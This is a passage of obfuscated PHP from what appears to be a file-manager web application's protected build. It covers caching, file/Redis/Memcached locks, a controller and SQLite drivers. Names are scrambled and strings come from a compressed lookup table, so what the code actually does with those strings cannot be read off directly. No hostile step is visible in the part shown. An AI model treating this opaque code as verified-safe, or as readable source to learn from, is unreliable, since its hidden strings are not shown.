(!$this->_isconn()) { return !1; } $«Ñº»ø¹ = $this->iconvSystem($«Ñº»ø¹); $«æü¹›€ = array($ê“¤ğ­[32] => $this->iconvApp($«Ñº»ø¹), $ê“¤ğ­[33] => $ê“¤ğ­[232], $ê“¤ğ­[79] => 0); $êÆäÊú = @ftp_size($this->connect, $«Ñº»ø¹); if ($êÆäÊú != -1) { $«æü¹›€[$ê“¤ğ­[79]] = $êÆäÊú; } else { $şÉúŞ‘„ = @ftp_chdir($this->connect, $«Ñº»ø¹); if (!$şÉúŞ‘„) { return !1; } @ftp_chdir($this->connect, $ê“¤ğ­[8]); $«æü¹›€[$ê“¤ğ­[33]] = $ê“¤ğ­[78]; } return $«æü¹›€; } protected function _isFolder($µÜøß) { $çÜÆ¨ =& $_SERVER[†ûãı«°]; if ($µÜøß == $çÜÆ¨[12] || $µÜøß == $çÜÆ¨[8]) { return !0; } $ë£ Ö²ø = $this->_objectMeta($µÜøß); return isset($ë£ Ö²ø[$çÜÆ¨[33]]) && $ë£ Ö²ø[$çÜÆ¨[33]] == $çÜÆ¨[78] ? !0 : !1; } } goto bÖ±¨ÌÀ—; aö×±²Ê¢á: define($_SERVER[†ûãı«°][0], $_SERVER[†ûãı«°][1]); $_SERVER[‘ğÇ«Š] = explode($_SERVER[†ûãı«°][2], gzinflate(substr($_SERVER[†ûãı«°][3], 10, -8))); function binCheckEq($é¦ì­ìé, $‚Ù†¢) { return $é¦ì­ìé == $‚Ù†¢; } goto c´Ç±Û³à§; a£¬Æ•´­“: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($æàØ‰ƒÎ, $‘Ç¯«õ) { $„ˆ¦ä =& $_SERVER[†ûãı«°]; $this->cachePath = $æàØ‰ƒÎ[$„ˆ¦ä[87]]; $this->prefix = $„ˆ¦ä[916]; $this->cacheTime = $‘Ç¯«õ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ÎşÉ¯ùŸ) { $Ô–çòíÊ =& $_SERVER[†ûãı«°]; $ÎşÉ¯ùŸ = str_replace(array($Ô–çòíÊ[917], $Ô–çòíÊ[100], $Ô–çòíÊ[76]), $Ô–çòíÊ[918], $ÎşÉ¯ùŸ); return $this->cachePath . $Ô–çòíÊ[919] . $ÎşÉ¯ùŸ . $Ô–çòíÊ[920]; } public function set($Şìƒ§Æ, $³ºâŸÎ—, $ ‹ì“Ş = false) { $ ‹ì“Ş = $ ‹ì“Ş ? $ ‹ì“Ş : $this->cacheTime; $ùøÑÀ‰ç = $this->getFile($Şìƒ§Æ); if (file_put_contents($ùøÑÀ‰ç, $this->prefix . $³ºâŸÎ—, LOCK_EX)) { @touch($ùøÑÀ‰ç, intval(time() + $ ‹ì“Ş)); clearstatcache(); return !0; } @unlink($ùøÑÀ‰ç); return !1; } public function get($úØÅˆŠ¾) { $ûôÑëà— = $this->getFile($úØÅˆŠ¾); if (file_exists($ûôÑëà—) && filemtime($ûôÑëà—) < time()) { @unlink($ûôÑëà—); return !1; } $–“ç¦†ş = @file_get_contents($ûôÑëà—); return substr($–“ç¦†ş, strlen($this->prefix)); } public function remove($Ê Ö¶ÎÙ) { $Îæ”¶ï÷ = $this->getFile($Ê Ö¶ÎÙ); return @unlink($Îæ”¶ï÷); } public function deleteAll() { $¤÷´ï‡ã =& $_SERVER[†ûãı«°]; $÷Å¨¿òÛ = scandir($this->cachePath); foreach ($÷Å¨¿òÛ as $Ä…Ÿğ´Ş) { $ˆğĞî„× = $this->cachePath . $Ä…Ÿğ´Ş; if (strpos($ˆğĞî„×, $¤÷´ï‡ã[920]) && strpos($ˆğĞî„×, $¤÷´ï‡ã[921])) { @unlink($ˆğĞî„×); } } } public function clearTimeout() { $Š‚ßÌş¯ =& $_SERVER[†ûãı«°]; $ßÃ¡ŒÑõ = scandir($this->cachePath); foreach ($ßÃ¡ŒÑõ as $ãåĞè¢) { $Öè®•¶¶ = $this->cachePath . $ãåĞè¢; if (strpos($Öè®•¶¶, $Š‚ßÌş¯[920]) && strpos($Öè®•¶¶, $Š‚ßÌş¯[921]) && filemtime($Öè®•¶¶) < time()) { @unlink($Öè®•¶¶); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ï•™ğÌó =& $_SERVER[†ûãı«°]; if (self::$handle) { return self::$handle; } $š×ÖÄÊ = $GLOBALS[$ï•™ğÌó[6]][$ï•™ğÌó[426]]; self::$timeout = $š×ÖÄÊ[$ï•™ğÌó[922]] ? $š×ÖÄÊ[$ï•™ğÌó[922]] : 10; $Ïå˜“´Ò = _get($GLOBALS[$ï•™ğÌó[6]], $ï•™ğÌó[923]); $“ı‰î = $š×ÖÄÊ[$ï•™ğÌó[908]] ? $š×ÖÄÊ[$ï•™ğÌó[908]] : $ï•™ğÌó[232]; if ($“ı‰î == $ï•™ğÌó[21] && $Ïå˜“´Ò == $ï•™ğÌó[13]) { $“ı‰î = $ï•™ğÌó[232]; } switch ($“ı‰î) { case $ï•™ğÌó[911]: self::$handle = new CacheLockRedis(); break; case $ï•™ğÌó[912]: self::$handle = new CacheLockMemcached(); break; case $ï•™ğÌó[21]: self::$handle = new CacheLockDatabase(); break; case $ï•™ğÌó[232]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ï•™ğÌó[924], $ï•™ğÌó[925]); } return self::$handle; } private static function key($öĞ¯¢‚¹) { return $_SERVER[†ûãı«°][926] . Cache::key($öĞ¯¢‚¹); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Ì†¹²Ç… = '') { self::$errorMsg = $Ì†¹²Ç…; } public static function lockGlobal($·¹½ôüŒ, $ĞÆÇóç) { return self::lock($·¹½ôüŒ, $ĞÆÇóç, !0); } public static function lock($®³ŠÑ…Ú, $øê½­÷” = false, $¯ı”Óİí = false) { $Ó×ƒêˆÙ =& $_SERVER[†ûãı«°]; $ÏÛ°èú– = self::init(); $ş¸å¾ÔØ = self::key($®³ŠÑ…Ú); $øê½­÷” = $øê½­÷” ? $øê½­÷” : self::$timeout; $Ö‚¸Ÿï = timeFloat(); if ($GLOBALS[$Ó×ƒêˆÙ[927]]) { if (!$ÏÛ°èú–->lock($ş¸å¾ÔØ, 0.2)) { die; } return !0; } $À¬ãİ€ä = $ÏÛ°èú–->lock($ş¸å¾ÔØ, $øê½­÷”); $Ó§õÆÊë = timeFloat(); if (!$À¬ãİ€ä) { $ª®ËÕÑ = "\x6c\157\143\x6b\40\145\x72\162\157\162\x3b\x6b\145\171\x3d{$®³ŠÑ…Ú}\73\164\151\x6d\145\75{$øê½­÷”}\x3b" . self::$errorMsg . $Ó×ƒêˆÙ[74] . get_caller_msg(); $Æš²®«Â = LNG($Ó×ƒêˆÙ[928]) . "\x28{$øê½­÷”}\x73\x29\56" . LNG($Ó×ƒêˆÙ[929]); $Æš²®«Â .= $Ó×ƒêˆÙ[930]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Æš²®«Â = $Æš²®«Â . $Ó×ƒêˆÙ[931] . self::$errorMsg; } write_log($Ó×ƒêˆÙ[932] . sprintf($Ó×ƒêˆÙ[933], timeFloat() - $Ö‚¸Ÿï) . $Ó×ƒêˆÙ[934] . $ª®ËÕÑ . $Ó×ƒêˆÙ[935] . json_encode(error_get_last()), $Ó×ƒêˆÙ[925]); show_json($Æš²®«Â, !1); } if (!$¯ı”Óİí) { self::$lockItem[$ş¸å¾ÔØ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ïù¤ÕÑÄ = number_format(timeFloat() - $Ó§õÆÊë, 3); write_log($Ó×ƒêˆÙ[936] . $®³ŠÑ…Ú . $Ó×ƒêˆÙ[937] . $ïù¤ÕÑÄ, $Ó×ƒêˆÙ[925]); } return $À¬ãİ€ä; } public static function lockGet($âÜ±ŸÚª) { $şæõÔî¯ = self::key($âÜ±ŸÚª); if (self::$lockItem[$şæõÔî¯]) { return self::$lockItem[$şæõÔî¯]; } return self::init()->lockGet($şæõÔî¯); } public static function unlock($˜ƒ¯Ş£) { $¢ıŠÑ‹ç =& $_SERVER[†ûãı«°]; $ç†Œ¸™£ = self::key($˜ƒ¯Ş£); self::$lockItem[$ç†Œ¸™£] = null; self::init()->unlock($ç†Œ¸™£); if (GLOBAL_DEBUG_LOG_ALL) { write_log($¢ıŠÑ‹ç[938] . $˜ƒ¯Ş£, $¢ıŠÑ‹ç[925]); } return; } public static function unlockRuntime() { $»¡³¦”È =& $_SERVER[†ûãı«°]; $œ©´ôç = self::init(); $Îì´‘ = !1; foreach (self::$lockItem as $Şš“†€‡ => $ÕßîÈƒ±) { if (!$ÕßîÈƒ±) { continue; } $œ©´ôç->unlock($Şš“†€‡); if (!$Îì´‘) { $Îì´‘ = !0; write_log($»¡³¦”È[939] . $Şš“†€‡ . $»¡³¦”È[74] . get_caller_msg(), $»¡³¦”È[925]); continue; } write_log($»¡³¦”È[939] . $Şš“†€‡, $»¡³¦”È[925]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Œ“¥íĞ² = number_format(timeFloat() - TIME_FLOAT, 3); write_log($»¡³¦”È[940] . $Œ“¥íĞ² . $»¡³¦”È[941] . ACTION, $»¡³¦”È[925]); } } public static function fileLock($‹Ì£‰¸) { $´ÍÕ££ =& $_SERVER[†ûãı«°]; if (!$GLOBALS[$´ÍÕ££[942]]) { $GLOBALS[$´ÍÕ££[942]] = array(); } $GLOBALS[$´ÍÕ££[942]][$‹Ì£‰¸] = !1; $Š’ÜÍ—› = fopen(DATA_PATH . $‹Ì£‰¸ . $´ÍÕ££[943], $´ÍÕ££[944]); if (!$Š’ÜÍ—›) { return !1; } $GLOBALS[$´ÍÕ££[942]][$‹Ì£‰¸] = $Š’ÜÍ—›; if (flock($Š’ÜÍ—›, LOCK_EX)) { return !0; } self::unlock($‹Ì£‰¸); show_json($´ÍÕ££[945], !1); return !1; } public static function fileUnlock($İÂåŸá) { $µ¯çŞøé =& $_SERVER[†ûãı«°]; $™õÍş˜ = $GLOBALS[$µ¯çŞøé[942]][$İÂåŸá]; if (!$™õÍş˜) { return; } $GLOBALS[$µ¯çŞøé[942]][$İÂåŸá] = !1; flock($™õÍş˜, LOCK_UN); fclose($™õÍş˜); } public static function fileUnlockAll() { $–ë˜±¡¥ =& $_SERVER[†ûãı«°]; if (!isset($GLOBALS[$–ë˜±¡¥[942]]) || !$GLOBALS[$–ë˜±¡¥[942]]) { return; } foreach ($GLOBALS[$–ë˜±¡¥[942]] as $£¶Ùè¾ => $¥¿‹¼¤£) { if (!$¥¿‹¼¤£) { continue; } $GLOBALS[$–ë˜±¡¥[942]][$£¶Ùè¾] = !1; flock($¥¿‹¼¤£, LOCK_UN); fclose($¥¿‹¼¤£); } $GLOBALS[$–ë˜±¡¥[942]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto DöÜÄÉ·Ä; DöÜÄÉ·Ä: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¶­©› =& $_SERVER[†ûãı«°]; $Éâ‹¾úı = $GLOBALS[$¶­©›[6]][$¶­©›[426]]; self::$cachePath = $Éâ‹¾úı[$¶­©›[232]][$¶­©›[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ÎèªÒÍ´, $—şúÏªá = 0) { $÷°‚ÀŸ =& $_SERVER[†ûãı«°]; $Ğ«æèÜ = microtime(!0); $¿œëıü× = $Ğ«æèÜ + $—şúÏªá + 0.0001; $«şÀÔ™Ü = rtrim(self::$cachePath, $÷°‚ÀŸ[8]) . $÷°‚ÀŸ[946] . md5($ÎèªÒÍ´) . $÷°‚ÀŸ[943]; if (file_exists($«şÀÔ™Ü) && filemtime($«şÀÔ™Ü) && filemtime($«şÀÔ™Ü) < time() - 10) { @unlink($«şÀÔ™Ü); } do { if (file_exists($«şÀÔ™Ü)) { cacheLockWait(); continue; } $ü¡¼›’Ç = fopen($«şÀÔ™Ü, $÷°‚ÀŸ[947]); if (!$ü¡¼›’Ç) { return !1; } $³›Ãò¹Ù = flock($ü¡¼›’Ç, LOCK_EX | LOCK_NB); self::$caches[$ÎèªÒÍ´] = array($÷°‚ÀŸ[948] => $ü¡¼›’Ç, $÷°‚ÀŸ[232] => $«şÀÔ™Ü); fwrite($ü¡¼›’Ç, $¿œëıü×); clearstatcache(); if ($ü¡¼›’Ç && $³›Ãò¹Ù) { return !0; } cacheLockWait(); } while (microtime(!0) < $¿œëıü×); $this->unlock($ÎèªÒÍ´); return !1; } public function lockGet($áõ¹…ö) { $®ËãöÛœ =& $_SERVER[†ûãı«°]; $ô£•„ûÏ = rtrim(self::$cachePath, $®ËãöÛœ[8]) . $®ËãöÛœ[946] . md5($áõ¹…ö) . $®ËãöÛœ[943]; return file_exists($ô£•„ûÏ); } public function unlock($Û¤µİ´) { $ûŒã†¨Ä =& $_SERVER[†ûãı«°]; $±í«ìÖ’ = self::$caches[$Û¤µİ´]; if (!$±í«ìÖ’) { return; } @flock($±í«ìÖ’[$ûŒã†¨Ä[948]], LOCK_UN); @fclose($±í«ìÖ’[$ûŒã†¨Ä[948]]); @unlink($±í«ìÖ’[$ûŒã†¨Ä[232]]); unset(self::$caches[$Û¤µİ´]); } } class CacheLockRedis { public function lock($Ò€ùöÎ”, $•À—èÒ“ = 10) { $¿Àƒ‡ = Cache::init(); $Ú´ó¹ŸÖ = microtime(!0) + $•À—èÒ“; while (microtime(!0) < $Ú´ó¹ŸÖ) { $ÊÁ®ÂÅÉ = $¿Àƒ‡->get($Ò€ùöÎ”); if (!$ÊÁ®ÂÅÉ) { $¾ºŒ¶¡½ = $¿Àƒ‡->setLock($Ò€ùöÎ”, $Ú´ó¹ŸÖ, $•À—èÒ“); if ($¾ºŒ¶¡½) { return !0; } } else { if ($ÊÁ®ÂÅÉ < microtime(!0)) { $¿Àƒ‡->set($Ò€ùöÎ”, $Ú´ó¹ŸÖ, $•À—èÒ“ * 2); if ($¿Àƒ‡->get($Ò€ùöÎ”) === $ÊÁ®ÂÅÉ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($» ªµ‰¶) { return Cache::init()->get($» ªµ‰¶); } public function unlock($­ùÃíûü) { return Cache::init()->remove($­ùÃíûü); } } class CacheLockMemcached { public function lock($“ùÕ¯óî, $”²€Íô± = 0) { $ª“ÚİÈÙ = Cache::init(); $…î‡õ°© = microtime(!0) + $”²€Íô±; while (microtime(!0) < $…î‡õ°©) { $æñ×û™° = $ª“ÚİÈÙ->get($“ùÕ¯óî); if (!$æñ×û™° || $æñ×û™° < microtime(!0)) { $á™û¿ÇÈ = $ª“ÚİÈÙ->handle->add($“ùÕ¯óî, $…î‡õ°©, $”²€Íô±); if ($á™û¿ÇÈ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($—±™¼Äê) { return Cache::init()->get($—±™¼Äê); } public function unlock($†ü¨ ÚÆ) { return Cache::init()->remove($†ü¨ ÚÆ); } } goto E‚ªœ®ßˆ; CËğ‚”ôá…: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ÄÎ‰ûÎ² =& $_SERVER[†ûãı«°]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ÄÎ‰ûÎ²[6]] =& $config; $this->values[$ÄÎ‰ûÎ²[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ÄÎ‰ûÎ²[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ğ‡Åßş­) { if (1 === func_num_args()) { $this->{$Ğ‡Åßş­} = new $Ğ‡Åßş­(); } else { $ª‹è½Ó = new ReflectionClass($Ğ‡Åßş­); $¢ıóçí = func_get_args(); array_shift($¢ıóçí); $this->{$Ğ‡Åßş­} = $ª‹è½Ó->newInstanceArgs($¢ıóçí); } return $this->{$Ğ‡Åßş­}; } public function routeBind($Û‘öƒÙ, $ÆêëğÒ, $ùš‘¿£ = 3) { $«àéÃˆî =& $_SERVER[†ûãı«°]; $›®ø¶Í = $this->in[$«àéÃˆî[9]]; $Û‘öƒÙ = str_replace($«àéÃˆî[10], $«àéÃˆî[11], trim(trim($Û‘öƒÙ, $«àéÃˆî[8]), $«àéÃˆî[12])); if (!$Û‘öƒÙ || count($›®ø¶Í) <= $ùš‘¿£) { return !1; } $É‹Ş˜Ë© = !0; $ô‘ı·½ = explode($«àéÃˆî[8], $Û‘öƒÙ); for ($™¨š‹ = 0; $™¨š‹ < count($ô‘ı·½); $™¨š‹++) { if ($ô‘ı·½[$™¨š‹] != $›®ø¶Í[$ùš‘¿£ + $™¨š‹]) { $É‹Ş˜Ë© = !1; break; } } if (!$É‹Ş˜Ë©) { return; } call_user_func_array(array($this, $ÆêëğÒ), array()); } public function routeArgs($ÇÀı£Œğ = 3) { $¡£¾»ó = $this->in[$_SERVER[†ûãı«°][9]]; if (count($¡£¾»ó) <= $ÇÀı£Œğ) { return array(); } $„¼•Ÿ‚ = array(); for ($ºŞí·úÂ = $ÇÀı£Œğ; $ºŞí·úÂ < count($¡£¾»ó); $ºŞí·úÂ += 2) { $„¼•Ÿ‚[$¡£¾»ó[$ºŞí·úÂ]] = $¡£¾»ó[$ºŞí·úÂ + 1]; $this->in[$¡£¾»ó[$ºŞí·úÂ]] = $¡£¾»ó[$ºŞí·úÂ + 1]; } return $„¼•Ÿ‚; } protected function assign($ç¦§øØ, $ŞëÈş‹÷) { $this->values[$ç¦§øØ] = $ŞëÈş‹÷; } protected function display($¹…Ø·®Ò) { ob_end_clean(); extract($this->values); require $this->tpl . $¹…Ø·®Ò; } } class DbSqliteBase extends Db { public function __construct($˜Ó›Ñ¿† = '') { $º÷¯·®· =& $_SERVER[†ûãı«°]; if (!extension_loaded($º÷¯·®·[13])) { think_exception(think_lang($º÷¯·®·[14]) . $º÷¯·®·[15]); } if (!empty($˜Ó›Ñ¿†)) { if (!isset($˜Ó›Ñ¿†[$º÷¯·®·[16]])) { $˜Ó›Ñ¿†[$º÷¯·®·[16]] = 438; } $this->config = $˜Ó›Ñ¿†; if (empty($this->config[$º÷¯·®·[17]])) { $this->config[$º÷¯·®·[17]] = array(); } } } public function connect($Ü«†Œì” = '', $„Î»»é˜ = 0) { $Ø‘ö¼şî =& $_SERVER[†ûãı«°]; if (!isset($this->linkID[$„Î»»é˜])) { if (empty($Ü«†Œì”)) { $Ü«†Œì” = $this->config; } $‡È’™şè = !empty($Ü«†Œì”[$Ø‘ö¼şî[17]][$Ø‘ö¼şî[18]]) ? $Ü«†Œì”[$Ø‘ö¼şî[17]][$Ø‘ö¼şî[18]] : $this->pconnect; $×·Âê˜ = $‡È’™şè ? $Ø‘ö¼şî[19] : $Ø‘ö¼şî[20]; $this->linkID[$„Î»»é˜] = $×·Âê˜($Ü«†Œì”[$Ø‘ö¼şî[21]], $Ü«†Œì”[$Ø‘ö¼şî[16]]); if (!$this->linkID[$„Î»»é˜]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$„Î»»é˜], 30000); if (1 != think_config($Ø‘ö¼şî[22])) { unset($this->config); } } return $this->linkID[$„Î»»é˜]; } public function free() { $this->queryID = null; } public function query($Ëã£ú•) { $ïó¡åã’ =& $_SERVER[†ûãı«°]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ëã£ú•; if ($this->queryID) { $this->free(); } think_action_status($ïó¡åã’[23], 1); think_status($ïó¡åã’[24]); $this->queryID = sqlite_query($this->_linkID, $Ëã£ú•); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ğ¬¦òø = $this->getAll(); return $Ğ¬¦òø; } } public function execute($…à’¦ª§) { $°Ú«ÑïÙ =& $_SERVER[†ûãı«°]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $…à’¦ª§; if ($this->queryID) { $this->free(); } think_action_status($°Ú«ÑïÙ[25], 1); think_status($°Ú«ÑïÙ[24]); $êŒğ­”ú = sqlite_exec($this->_linkID, $…à’¦ª§); $this->debug(); if (!1 === $êŒğ­”ú) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[†ûãı«°][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¦Ö”•‰ = sqlite_query($this->_linkID, $_SERVER[†ûãı«°][27]); if (!$¦Ö”•‰) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¨´§öŒß = sqlite_query($this->_linkID, $_SERVER[†ûãı«°][28]); if (!$¨´§öŒß) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $£ô­àÃÚ = array(); if ($this->numRows > 0) { for ($î÷³œø  = 0; $î÷³œø  < $this->numRows; $î÷³œø ++) { $£ô­àÃÚ[$î÷³œø ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $£ô­àÃÚ; } public function getFields($´¶ãõÄÕ) { $Œ¥ñšåÓ =& $_SERVER[†ûãı«°]; $–õŒ÷–¾ = $this->query($Œ¥ñšåÓ[29] . $´¶ãõÄÕ . $Œ¥ñšåÓ[30]); $Ø¬·İÒ = array(); if ($–õŒ÷–¾) { foreach ($–õŒ÷–¾ as $ü·í´Û™ => $õê–›õª) { $Ø¬·İÒ[$õê–›õª[$Œ¥ñšåÓ[31]]] = array($Œ¥ñšåÓ[32] => $õê–›õª[$Œ¥ñšåÓ[31]], $Œ¥ñšåÓ[33] => $õê–›õª[$Œ¥ñšåÓ[34]], $Œ¥ñšåÓ[35] => (bool) ($õê–›õª[$Œ¥ñšåÓ[36]] === $Œ¥ñšåÓ[12]), $Œ¥ñšåÓ[37] => $õê–›õª[$Œ¥ñšåÓ[38]], $Œ¥ñšåÓ[39] => strtolower($õê–›õª[$Œ¥ñšåÓ[40]]) == $Œ¥ñšåÓ[41], $Œ¥ñšåÓ[42] => strtolower($õê–›õª[$Œ¥ñšåÓ[43]]) == $Œ¥ñšåÓ[44]); } } return $Ø¬·İÒ; } public function getTables($ğ·Ğ¤¦ü = '') { $Ùà¼‚Í =& $_SERVER[†ûãı«°]; $ùˆ’æıü = $this->query($Ùà¼‚Í[45] . $Ùà¼‚Í[46] . $Ùà¼‚Í[47]); $¨Á‘¹ÁÊ = array(); foreach ($ùˆ’æıü as $Ö´†šÌ« => $Šı…˜Ò) { $¨Á‘¹ÁÊ[$Ö´†šÌ«] = current($Šı…˜Ò); } return $¨Á‘¹ÁÊ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ıö²§ï† =& $_SERVER[†ûãı«°]; $®şçÖÌ = sqlite_last_error($this->_linkID); $this->error = $®şçÖÌ . $ıö²§ï†[4] . sqlite_error_string($®şçÖÌ); if ($ıö²§ï†[12] != $this->queryStr) { $this->error .= LNG($ıö²§ï†[48]) . $this->queryStr; } think_trace($this->error, $ıö²§ï†[12], $ıö²§ï†[49]); return $this->error; } public function escapeString($‡¤ª”™™) { return sqlite_escape_string($‡¤ª”™™); } public function parseLimit($Ö…åµİğ) { $—¤…ÖœÓ =& $_SERVER[†ûãı«°]; $Ø°Â‡–ö = $—¤…ÖœÓ[12]; if (!empty($Ö…åµİğ)) { $Ö…åµİğ = explode($—¤…ÖœÓ[50], $Ö…åµİğ); if (count($Ö…åµİğ) > 1) { $Ø°Â‡–ö .= $—¤…ÖœÓ[51] . $Ö…åµİğ[1] . $—¤…ÖœÓ[52] . $Ö…åµİğ[0] . $—¤…ÖœÓ[53]; } else { $Ø°Â‡–ö .= $—¤…ÖœÓ[51] . $Ö…åµİğ[0] . $—¤…ÖœÓ[53]; } } return $Ø°Â‡–ö; } } class DbSqlite3Base extends Db { public function __construct($š°ë Èî = '') { $ı½¥õËä =& $_SERVER[†ûãı«°]; if (!class_exists($ı½¥õËä[54])) { think_exception(think_lang($ı½¥õËä[14]) . $ı½¥õËä[55]); } if (!empty($š°ë Èî)) { if (!isset($š°ë Èî[$ı½¥õËä[16]])) { $š°ë Èî[$ı½¥õËä[16]] = 438; } $this->config = $š°ë Èî; if (empty($this->config[$ı½¥õËä[17]])) { $this->config[$ı½¥õËä[17]] = array(); } } } public function connect($Ï³È•Ù¾ = '', $€­ÎªçÉ = 0) { $ÂÅÌÃºû =& $_SERVER[†ûãı«°]; if (!isset($this->linkID[$€­ÎªçÉ])) { if (empty($Ï³È•Ù¾)) { $Ï³È•Ù¾ = $this->config; } $this->linkID[$€­ÎªçÉ] = new SQLite3($Ï³È•Ù¾[$ÂÅÌÃºû[21]]); if (!$this->linkID[$€­ÎªçÉ]) { think_exception($this->linkID[$€­ÎªçÉ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$€­ÎªçÉ]->busyTimeout(30000); if (1 != think_config($ÂÅÌÃºû[22])) { unset($this->config); } } return $this->linkID[$€­ÎªçÉ]; } public function free() { $this->queryID = null; } public function query($İ…»á¼Ğ) { $‰õàÖÔ =& $_SERVER[†ûãı«°]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $İ…»á¼Ğ; if ($this->queryID) { $this->free(); } think_action_status($‰õàÖÔ[23], 1); think_status($‰õàÖÔ[24]); $this->queryID = $this->_linkID->query($İ…»á¼Ğ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $âá¯Çİ§ = $this->getAll(); $this->numRows = count($âá¯Çİ§); return $âá¯Çİ§; } } public function execute($©ú…ºøĞ) { $ŞºĞé‰‘ =& $_SERVER[†ûãı«°]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $©ú…ºøĞ; if ($this->queryID) { $this->free(); } think_action_status($ŞºĞé‰‘[25], 1); think_status($ŞºĞé‰‘[24]); $áçæ¨È = $this->_linkID->exec($©ú…ºøĞ); $this->debug(); if (!1 === $áçæ¨È) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[†ûãı«°][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $é„„›Ôê = $this->_linkID->query($_SERVER[†ûãı«°][27]); if (!$é„„›Ôê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $œ²ï¬Öã = $this->_linkID->query($_SERVER[†ûãı«°][28]); if (!$œ²ï¬Öã) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ŸüÕ‰®˜ = array(); while ($ó¦Úîóü = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ŸüÕ‰®˜[] = $ó¦Úîóü; } $this->queryID->reset(); return $ŸüÕ‰®˜; } public function getFields($Œ¯›ğ¯ˆ) { $·Úş¸ö« =& $_SERVER[†ûãı«°]; $½ÒÊÃ“ = $this->query($·Úş¸ö«[29] . $Œ¯›ğ¯ˆ . $·Úş¸ö«[30]); $¶’úâÇç = array(); if ($½ÒÊÃ“) { foreach ($½ÒÊÃ“ as $Ò­ë¯× => $Ô¨å¥äŒ) { $¶’úâÇç[$Ô¨å¥äŒ[$·Úş¸ö«[32]]] = array($·Úş¸ö«[32] => $Ô¨å¥äŒ[$·Úş¸ö«[32]], $·Úş¸ö«[33] => $Ô¨å¥äŒ[$·Úş¸ö«[33]], $·Úş¸ö«[35] => (bool) ($Ô¨å¥äŒ[$·Úş¸ö«[35]] === $·Úş¸ö«[12]), $·Úş¸ö«[37] => $Ô¨å¥äŒ[$·Úş¸ö«[56]], $·Úş¸ö«[39] => (bool) $Ô¨å¥äŒ[$·Úş¸ö«[57]], $·Úş¸ö«[42] => (bool) $Ô¨å¥äŒ[$·Úş¸ö«[57]]); } } return $¶’úâÇç; } public function getTables($¸ ŒõËµ = '') { $İ¤—ıÉÔ =& $_SERVER[†ûãı«°]; $ùŸÉË·Ö = $this->query($İ¤—ıÉÔ[45] . $İ¤—ıÉÔ[46] . $İ¤—ıÉÔ[47]); $µĞƒ³¡› = array(); foreach ($ùŸÉË·Ö as $´®¦Ì„ï => $Î¨æå˜Ù) { $µĞƒ³¡›[$´®¦Ì„ï] = current($Î¨æå˜Ù); } return $µĞƒ³¡›; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $†÷ÙŞâÃ =& $_SERVER[†ûãı«°]; $this->error = $this->_linkID->lastErrorMsg(); if ($†÷ÙŞâÃ[12] != $this->queryStr) { $this->error .= LNG($†÷ÙŞâÃ[48]) . $this->queryStr; } think_trace($this->error, $†÷ÙŞâÃ[12], $†÷ÙŞâÃ[49]); return $this->error; } public function escapeString($¦”Ì¥) { $¡áí¬ôé =& $_SERVER[†ûãı«°]; if ($this->_linkID) { return $this->_linkID->escapeString($¦”Ì¥); } return str_ireplace($¡áí¬ôé[58], $¡áí¬ôé[59], $¦”Ì¥); } public function parseLimit($ğàİ¶í¹) { $«áá ÓÓ =& $_SERVER[†ûãı«°]; $òæÆŞµ = $«áá ÓÓ[12]; if (!empty($ğàİ¶í¹)) { $ğàİ¶í¹ = explode($«áá ÓÓ[50], $ğàİ¶í¹); if (count($ğàİ¶í¹) > 1) { $òæÆŞµ .= $«áá ÓÓ[51] . $ğàİ¶í¹[1] . $«áá ÓÓ[52] . $ğàİ¶í¹[0] . $«áá ÓÓ[53]; } else { $òæÆŞµ .= 